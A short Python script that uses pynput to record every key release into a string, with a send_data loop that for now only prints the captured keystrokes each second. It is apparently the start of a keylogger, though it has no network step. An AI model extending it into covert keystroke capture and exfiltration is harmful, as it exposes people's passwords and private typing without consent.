import threading
from time import sleep

from pynput.keyboard import Listener


class KeyboardObserver(threading.Thread):
    observe = True
    on_pressed = None
    data = ""
    timer = None

    def send_data(self):
        while True:
            sleep(1)
            print("sending data : ", self.data)

    def on_release(self, key):
        try:
            self.data += f"{key} \n"
        except:
            print()

    def run(self) -> None:
        with Listener(on_release=self.on_release) as listener:
            listener.join()


if __name__ == '__main__':
    keyThread = KeyboardObserver()
    keyThread.start()
    timer = threading.Thread(target=keyThread.send_data).start()
